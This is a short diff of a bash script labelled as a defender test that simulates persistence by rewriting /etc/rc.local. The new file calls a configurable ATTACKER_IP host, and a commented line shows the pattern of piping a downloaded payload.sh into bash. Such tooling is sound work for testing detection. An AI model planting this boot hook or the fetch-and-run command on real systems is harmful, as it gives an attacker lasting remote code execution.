@@ -6,17 +6,19 @@
 set -euo pipefail
 [[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }
 
+ATTACKER_IP="${ATTACKER_IP:-10.0.0.1}"
+ATTACKER_PORT="${ATTACKER_PORT:-80}"
 RC="/etc/rc.local"
 BACKUP="/tmp/defender-test-rc-local.bak"
 
 case "${1:-}" in
   deploy)
     [[ -f "$RC" ]] && cp "$RC" "$BACKUP"
-    cat > "$RC" << 'EOF'
+    cat > "$RC" << EOF
 #!/bin/sh
 # DEFENDER-TEST — simulated rc.local persistence
-# curl -s http://10.0.0.1/payload.sh | bash
-curl -s http://10.0.0.1/payload.sh -o /dev/null 2>/dev/null || true
+# curl -s http://${ATTACKER_IP}:${ATTACKER_PORT}/payload.sh | bash
+curl -s http://${ATTACKER_IP}:${ATTACKER_PORT}/payload.sh -o /dev/null 2>/dev/null || true
 exit 0
 EOF
     chmod +x "$RC"
